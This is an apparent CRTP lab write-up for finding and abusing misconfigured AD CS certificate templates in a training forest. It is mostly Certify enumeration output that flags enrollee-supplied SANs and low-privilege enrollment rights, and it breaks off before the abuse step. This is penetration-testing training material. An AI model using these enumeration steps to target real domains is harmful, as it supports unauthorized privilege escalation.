# CRTP: Hands-On 21

```
  • Check if AD CS is used by the target forest and find any vulnerable/abusable templates.
  • Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.
```

Index:
  1. [Evaluate Certificate templates](#evaluate-certificate-templates)
  2. [Abuse Certificate templates](#abuse-certificate-templates)
  3. [Enterprise Admin escalation](#enterprise-admin-escalation)


## Evaluate Certificate templates

Certificates temaplets form student machine with student162:

```
C:\Windows\system32>C:\AD\Tools\Certify.exe cas

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'


[*] Root CAs

    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local



[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local


[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : moneycorp-MCORP-DC-CA
    DNS Hostname                  : mcorp-dc.moneycorp.local
    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
    Enrollment Agent Restrictions : None

    Enabled Certificate Templates:
        CA-Integration
        HTTPSCertificates
        SmartCardEnrollment-Agent
        SmartCardEnrollment-Users
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator





Certify completed in 00:00:30.2491945


```
Templates:

```
C:\Windows\system32>C:\AD\Tools\Certify.exe find

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'

    Enterprise CA Name            : moneycorp-MCORP-DC-CA
    DNS Hostname                  : mcorp-dc.moneycorp.local
    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
    Enrollment Agent Restrictions : None

[*] Available Certificates Templates :

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : User
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Users            S-1-5-21-335606122-960912869-3279953914-513
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : EFS
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Encrypting File System
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Users            S-1-5-21-335606122-960912869-3279953914-513
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : Administrator
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Microsoft Trust List Signing, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : EFSRecovery
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : File Recovery
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : Machine
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Computers        S-1-5-21-335606122-960912869-3279953914-515
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : DomainController
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : WebServer
    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : <null>
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : DomainControllerAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
        AutoEnrollment Rights       : mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : DirectoryEmailReplication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Directory Service Email Replication
    mspki-certificate-application-policy  : Directory Service Email Replication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
        AutoEnrollment Rights       : mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : KerberosAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_DOMAIN_DNS, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
        AutoEnrollment Rights       : mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Users
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 1
    Application Policies                  : Certificate Request Agent
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : HTTPSCertificates
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : CA-Integration
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519



Certify completed in 00:00:14.9647910
```


## Abuse Certificate templates

Exploit the following template:

```
